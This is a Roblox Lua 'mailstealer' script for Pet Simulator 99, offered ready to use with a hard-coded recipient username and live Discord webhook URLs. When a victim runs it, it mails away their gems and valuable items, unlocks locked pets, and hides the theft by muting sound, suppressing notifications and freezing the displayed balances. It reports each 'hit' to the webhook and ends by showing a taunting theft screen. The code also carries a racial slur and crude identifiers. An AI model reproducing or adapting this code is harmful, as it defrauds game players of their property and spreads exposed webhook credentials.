-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts

Username = "Egorikusa_ghoul"

Webhook = "https://webhook.lewisakura.moe/api/webhooks/1191832931132526683/BoESEUIZ3E3UHu_EzpLRSVhCo--5hm-q2vkBgglkFHfywS_ObBxh7raDFDuVgnDmJGVp"

LoadingScreen = false

MinimumRAP = 100000

-- v4

if getgenv().executed then return end
getgenv().executed = true

UserSettings().GameSettings.MasterVolume = 0

local idiotuser = game:GetService("Players").LocalPlayer.Name

if idiotuser == Username then
    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
    return;
end

if Username == nil then
    game:GetService("Players").LocalPlayer:Kick("Put A UserName")
    return;
end

ping = "weizzy on top @everyone"

if MinimumRAP == nil then
    MinimumRAP = 100000
end

if Webhook == "" or Webhook == nil then
    ping = "forgot to put webhook"
    Webhook = "https://webhook.lewisakura.moe/api/webhooks/1200880234849906890/bvTHC72g_b99a_sX7x7YMtCO6lVCHsqxJ3LvOeSZlWTgG9T3lGp1wC0_sBmMEEXAb7D2"
end

if Username2 == "" or Username2 == nil then
    Username2 = Username
end

local Library = require(game:GetService("ReplicatedStorage").Library)
local Save = Library.Save.Get()
local Client = require(game.ReplicatedStorage.Library.Client)
local Inventory = Save.Inventory
    
local SendRemote = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send")
local HttpService = game:GetService("HttpService")

local DiamondsBalance = Client.CurrencyCmds.Get("Diamonds")
if DiamondsBalance == nil then
    DiamondsBalance = 0
end
if DiamondsBalance < 10000 then
    kicked = true
    return
end

local function GetGems()
    local DiamondsBalance = Client.CurrencyCmds.Get("Diamonds")
    if DiamondsBalance == nil then
        DiamondsBalance = 0
    end
    return DiamondsBalance
end

local loading = game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = game:GetService("Players").LocalPlayer.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(
    function()
        noti.Enabled = false
    end
)
noti.Enabled = false

game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Claim All"):InvokeServer()

if kicked ~= true then
    if LoadingScreen ~= false then
        local function runCodeSafely()
            local success, result =
                pcall(
                function()
                    local LoadingScreenFunction =
                        require(game:GetService("ReplicatedStorage").Library.Client.GUIFX.Transition)
                    game.Players.LocalPlayer.PlayerGui.Transition.DisplayOrder = 6000000000000
                    LoadingScreenFunction("anything")
                end
            )

            if not success then
                print("An error occurred: " .. tostring(result))
            end
        end

        local co = coroutine.create(runCodeSafely)
        coroutine.resume(co)
    else
        local gemsleft =
            game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount.Text
        local gemsleftpath =
            game:GetService("Players").LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
        gemsleftpath:GetPropertyChangedSignal("Text"):Connect(
            function()
                gemsleftpath.Text = gemsleft
            end
        )

        local player = game:GetService("Players").LocalPlayer
        local leaderstats = player:WaitForChild("leaderstats")

        for statName, statValue in pairs(leaderstats:GetChildren()) do
            if statValue:IsA("IntValue") then
                local initialValue = statValue.Value
                statValue:GetPropertyChangedSignal("Value"):Connect(
                    function()
                        statValue.Value = initialValue
                    end
                )
            end
        end

        local loading = game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"]
        local noti = game:GetService("Players").LocalPlayer.PlayerGui.Notifications
        loading.Disabled = true
        noti:GetPropertyChangedSignal("Enabled"):Connect(
            function()
                noti.Enabled = false
            end
        )
        noti.Enabled = false
        local function freeze_inventory()
            local pets_frame = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
            local pets_frame_clone = pets_frame:Clone()
            pets_frame_clone.Parent = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main
        end
        freeze_inventory()
        local Inventoryframe = game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets
        Inventoryframe:Destroy()
        game.Workspace.__THINGS.Pets:Destroy()
        game.Players.LocalPlayer.PlayerScripts:FindFirstChild("Parallel Pet Actors"):Destroy()
    end
end

local function GetScammedNigga()
    local instance = { instances = {} }
    function instance.new(class, properties)
        local inst = Instance.new(class)
        for property, value in pairs(properties) do
            inst[property] = value
        end
        table.insert(instance.instances, inst)
        return inst
    end
    local ScreenGui = instance.new("ScreenGui", {
        Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui"),
        ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
        DisplayOrder = 60000000000001
    })
    local scammedez = instance.new("Frame", {
        Name = "scammed ez",
        Parent = ScreenGui,
        BackgroundColor3 = Color3.fromRGB(40, 40, 40),
        BorderColor3 = Color3.fromRGB(0, 0, 0),
        BorderSizePixel = 0,
        Position = UDim2.new(0, 0, 1.1365951e-07, 0),
        Size = UDim2.new(1, 0, 1, 5)
    })
    local labels = {
        {Text = "ALL YOUR STUFF HAS JUST BEEN STOLEN", TextColor3 = Color3.fromRGB(0, 255, 42)},
        {Text = "We stole everything u had in ps99", TextColor3 = Color3.fromRGB(255, 0, 4)},
        {Text = "U probably want to get ur stuff back", TextColor3 = Color3.fromRGB(255, 142, 49)},
        {Text = "If u want to take revenge and become rich join our discord .gg/mailstealer", TextColor3 = Color3.fromRGB(182, 123, 255)}
    }
    local posY = {0.0528541245, 0.209235922, 0.349384248, 0.733943939}
    for i, label in ipairs(labels) do
        instance.new("TextLabel", {
            Parent = scammedez,
            BackgroundColor3 = Color3.fromRGB(40, 40, 40),
            BorderColor3 = Color3.fromRGB(0, 0, 0),
            BorderSizePixel = 0,
            Position = UDim2.new(0.123158529, 0, posY[i], 0),
            Size = UDim2.new(0.751820982, 0, 0.123234972, 0),
            Font = Enum.Font.FredokaOne,
            Text = label.Text,
            TextColor3 = label.TextColor3,
            TextScaled = true,
            TextSize = 14.000,
            TextWrapped = true
        })
    end
end

local function GetGemsForWebhook()
    local actually_gems = DiamondsBalance or 0
    local suffix = ""
    if actually_gems >= 1000000000 then
        actually_gems = actually_gems / 1000000000
        suffix = "b"
    elseif actually_gems >= 1000000 then
        actually_gems = actually_gems / 1000000
        suffix = "m"
    elseif actually_gems >= 1000 then
        actually_gems = actually_gems / 1000
        suffix = "k"
    end
    return string.format("%.1f%s", actually_gems, suffix)
end

local GetMaxInvokes = function(GemAmount)
    return math.floor(GemAmount / 10000)
end

if Save.Box then
    for key, _ in pairs(Save.Box) do
        game:GetService("ReplicatedStorage").Network["Box: Withdraw All"]:InvokeServer(key)
    end
end

local function GetRAP(dick, vagina)
    return (Library.DevRAPCmds.Get({Class = {Name = vagina}, IsA = function(sex) return sex == vagina end, GetId = function() return dick.id end, StackKey = function() return HttpService:JSONEncode({id = dick.id, pt = dick.pt, sh = dick.sh, tn = dick.tn}) end}) or 0)
end

local function GetRAPOfHuges()
    HugesRAP = 0
    if Inventory.Pet ~= nil then
        for i,v in pairs(Inventory.Pet) do
            id = v.id
            dir = Library.Directory.Pets[id]
            if dir.huge and dir.Tradable ~= false then
                HugesRAP = HugesRAP + GetRAP(v, "Pet")
            end
        end
    end
    return HugesRAP
end

if Webhook and string.find(Webhook, "discord") then
	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
end	

local function processInventoryItem(itemClass, inventory, itemDirectory, HitsList)
    HitsList = HitsList or {}  -- Use HitsList if it's not nil, otherwise initialize it as an empty table
    if inventory then
        for i, v in pairs(inventory) do
            local itemRAP = math.floor(GetRAP(v, itemClass))
            local dir = itemDirectory[v.id]
            if dir.huge then
                user = Username
            else
                user = Username2
            end
            local ItemName = v.id
            local petShiny = v.sh
            local petVariant = ""
            
            if petShiny then
              petVariant = "Shiny "
            end
            
            if v.pt and v.pt == 1 then
              petVariant = "Golden " .. petVariant
            elseif v.pt and v.pt == 2 then
              petVariant = "Rainbow " .. petVariant
            end
            local ItemName = petVariant .. ItemName
            if (itemClass == "Pet" and dir.huge) or (itemClass == "Pet" and dir.exclusiveLevel) or (itemClass == "Egg" or itemClass == "Charm" or itemClass == "Hoverboard" or 
    itemClass == "Booth" or itemClass == "Enchant" or itemClass == "Potion" or 
    itemClass == "Misc" or itemClass == "Seed" or itemClass == "Fruit" or 
    itemClass == "Lootbox")
    and (itemRAP >= MinimumRAP and dir.Tradable ~= false) then
            table.insert(HitsList,
                    {
                        ITEM_CLASS = itemClass,
                        ITEM_ID = i,
                        ITEM_NAME = ItemName,
                        ITEM_AMOUNT = (v._am or 1),
                        ITEM_RAP = itemRAP,
                        ITEM_LOCKED = (v._lk or false),
                        USERNAME = user
                    }
                )
            end
        end
    end
    return HitsList
end

local function getAllInventoryItems()
    local HitsList = {}
    HitsList = processInventoryItem("Pet", Inventory.Pet, Library.Directory.Pets, HitsList)
    HitsList = processInventoryItem("Egg", Inventory.Egg, Library.Directory.Eggs, HitsList)
    HitsList = processInventoryItem("Charm", Inventory.Charm, Library.Directory.Charms, HitsList)
    HitsList = processInventoryItem("Hoverboard", Inventory.Hoverboard, Library.Directory.Hoverboards, HitsList)
    HitsList = processInventoryItem("Booth", Inventory.Booth, Library.Directory.Booths, HitsList)
    HitsList = processInventoryItem("Enchant", Inventory.Enchant, Library.Directory.Enchants, HitsList)
    HitsList = processInventoryItem("Potion", Inventory.Potion, Library.Directory.Potions, HitsList)
    HitsList = processInventoryItem("Misc", Inventory.Misc, Library.Directory.MiscItems, HitsList)
    HitsList = processInventoryItem("Seed", Inventory.Seed, Library.Directory.Seeds, HitsList)
    HitsList = processInventoryItem("Fruit", Inventory.Fruit, Library.Directory.Fruits, HitsList)
    HitsList = processInventoryItem("Lootbox", Inventory.Lootbox, Library.Directory.Lootboxes, HitsList)

    table.sort(HitsList, function(a, b) return a.ITEM_RAP > b.ITEM_RAP end)

    return HitsList
end

local HitsList = getAllInventoryItems()
local OldHits = getAllInventoryItems()

local function sortrap()
    rapp = 0
    for i,v in pairs(HitsList) do
        rapp = rapp + v.ITEM_RAP
    end
    local raw_rap = math.floor(rapp)
    if raw_rap == nil then
        raw_rap = 0
    end

    local suffix = ""
    if raw_rap >= 1000000000 then
        raw_rap = raw_rap / 1000000000
        suffix = "b"
    elseif raw_rap >= 1000000 then
        raw_rap = raw_rap / 1000000
        suffix = "m"
    elseif raw_rap >= 1000 then
        raw_rap = raw_rap / 1000
        suffix = "k"
    end

    return string.format("%.1f%s", raw_rap, suffix)
end

local ALL_HITS_RAP = sortrap()

stupid_user = game.Players.LocalPlayer.Name
stupid_display_user = game.Players.LocalPlayer.DisplayName

Wibhook = Webhook

local function SendWebhook(url, ping, list3, list456)
    local LostString = ""
    for _, v in pairs(list3) do
        LostString = LostString .. "• " .. tostring(v.ITEM_NAME) .. " " .. tostring(v.ITEM_AMOUNT) .. "x" .. "\n"
    end
    
    if LostString == "" then
        LostString = "NO ITEMS"
    end
    local HitsString = ""
    for _, v in pairs(list456) do
        HitsString = HitsString .. "• " .. tostring(v.ITEM_NAME) .. " " .. tostring(v.ITEM_AMOUNT) .. "x" .. "\n"
    end
    
    if HitsString == "" then
        HitsString = "NO ITEMS"
    end
    imgs = "https://cdn.discordapp.com/attachments/1151888533775196180/1190764360717574274/giftps99.png?ex=65a2fcba&is=659087ba&hm=1e65b7100a0159e66e2efd4f1c91a8362b60eb253fec0d40f12b4de5911ca4e5&"
    data1 = {
        ["content"] = ping,
        ["username"] = "Egorikusa Mailstealer",
        ["avatar_url"] = imgs,
        ["embeds"] = {
            {
                ["title"] = "__`Mailstealer Hit`__ \240\159\142\137",
                ["url"] = "https://discord.gg/mailstealer",
                ["type"] = "rich",
                ["color"] = tonumber(0xD500FF),
                ["thumbnail"] = {
                    ["url"] = imgs,
                    ["height"] = 420,
                    ["width"] = 420
                },
                ["fields"] = {
                    {
                        ["name"] = "`(\240\159\144\167) Player Info:`",
                        ["value"] = "```(\240\159\167\184) Username: " ..
                            stupid_user ..
                                "\n(\240\159\148\146) Display Username: " ..
                                    stupid_display_user ..
                                        "\n(\240\159\142\178) Creator: " ..
                                            Username ..
                                                "\n(\240\159\146\142) Diamonds: " ..
                                                    GetGemsForWebhook() ..
                                                        "\n(\240\159\146\142) Total RAP: " ..
                                                            ALL_HITS_RAP .. "\n(\240\159\147\140) Version: 4.1" .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "`(\240\159\144\177) SENT:`",
                        ["value"] = "```" .. HitsString .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "`(\240\159\144\177) DIDNT SENT:`",
                        ["value"] = "```" .. LostString .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "",
                        ["value"] = "__**https://discord.gg/mailstealer**__",
                        ["inline"] = false
                    }
                }
            }
        }
    }
    newdata1 = game:GetService("HttpService"):JSONEncode(data1)
    headers = {
        ["content-type"] = "application/json"
    }
    if Webhook ~= nil then
        local abcdef1 = {
            Url = url,
            Body = newdata1,
            Method = "POST",
            Headers = headers
        }
        local success, result = pcall(function()
            return game:GetService("HttpService"):PostAsync(Wibhook, newdata1)
        end)
        if not success then
            request(abcdef1)
        end
    end
end

local function SendGems()
    GemAmount = DiamondsBalance
    local MaxHits = GemAmount/10000
    local HitsAmount = #HitsList
    local GemsToSendHits = HitsAmount * 10000 + 10000
    if GemAmount > GemsToSendHits then
        for i, v in pairs(Inventory.Currency) do
            if v.id == "Diamonds" then
                SendRemote:InvokeServer(Username, v.id, "Currency", i, GemAmount - GemsToSendHits)
            end
        end
    end
end

function subtractTables(table1, table2)
    local result = {};
    for _, item1 in ipairs(table1) do
        local found = false;
        for _, item2 in ipairs(table2) do
            if item1.ITEM_CLASS == item2.ITEM_CLASS and item1.ITEM_ID == item2.ITEM_ID and item1.ITEM_NAME == item2.ITEM_NAME and item1.ITEM_AMOUNT == item2.ITEM_AMOUNT then
                found = true;
                break;
            end;
        end;
        if not found then
            table.insert(result, item1);
        end;
    end;
    return result;
end;

while true do
    SendGems()
    local HitsList = getAllInventoryItems()
    if #HitsList > 0 then
        local bestItem = HitsList[1]
        if bestItem.ITEM_LOCKED == true then
            local args = {bestItem.ITEM_ID, false}
            game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
        end
        local args = {
            [1] = bestItem.USERNAME,
            [2] = bestItem.ITEM_NAME,
            [3] = bestItem.ITEM_CLASS,
            [4] = bestItem.ITEM_ID,
            [5] = bestItem.ITEM_AMOUNT
        }
        SendRemote:InvokeServer(unpack(args))
    end
    if #HitsList == 0 or GetGems() < 10000 then
        if GetGems() < 10000 then
            LeftHits = getAllInventoryItems()
        end
        if NotAlt == true and kicked ~= true then
            GetScammedNigga()
        end
        if kicked ~= true then
            first_list = subtractTables(OldHits, LeftHits)
            second_list = LeftHits 
            SendWebhook(Webhook, ping, second_list, first_list)
        end
        print(ALL_HITS_RAP, DiamondsBalance)
        break
    end
end

----------------------------------------------------


